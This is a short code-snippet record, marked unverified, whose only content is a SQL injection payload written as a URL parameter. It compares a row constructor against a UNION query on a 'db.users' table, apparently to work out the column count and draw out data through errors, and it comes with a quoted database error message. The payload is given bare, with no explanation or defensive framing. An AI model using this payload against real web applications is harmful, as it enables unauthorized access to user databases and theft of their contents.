---
id: e70f4a9c-ffe2-49c3-be6d-f4c765723e77
type: code
language: SQL
verified: false
created_at: '2023-04-06T03:56:34.392661+00:00'
updated_at: '2023-04-10T20:22:52.412674+00:00'
---

# Code Snippet e70f4a9c

**Language**: SQL

```sql
?id=1 and (1,2,3,4) = (SELECT * from db.users UNION SELECT 1,2,3,4 LIMIT 1)
--Column 'id' cannot be null
```
